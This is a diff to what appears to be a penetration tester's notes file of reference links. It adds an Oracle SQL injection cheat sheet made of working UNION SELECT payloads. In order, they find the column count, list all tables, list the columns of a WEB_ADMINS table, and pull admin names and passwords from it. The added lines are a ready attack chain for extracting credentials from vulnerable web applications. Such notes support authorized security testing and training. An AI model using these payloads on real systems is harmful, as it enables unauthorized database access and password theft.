@@ -18,6 +18,17 @@ https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
 [sql injection cheat sheet]
 https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
 
+[sql injection: Oracle]
+# find number of columns
+// ps: the datatype must be the same
+'UNION+SELECT+'a','a',1+FROM+DUAL--+
+# find all tables
+'UNION+SELECT+table_name,NULL,1+FROM+all_tables--+
+# find column name based from table name
+'UNION+SELECT+column_name,NULL,1+FROM+all_tab_columns+WHERE+table_name='WEB_ADMINS'--+
+# fetch data from table
+'UNION+SELECT+ADMIN_NAME,PASSWORD,1+FROM+WEB_ADMINS--+ 
+
 [sql trucation attack]
 https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html
 
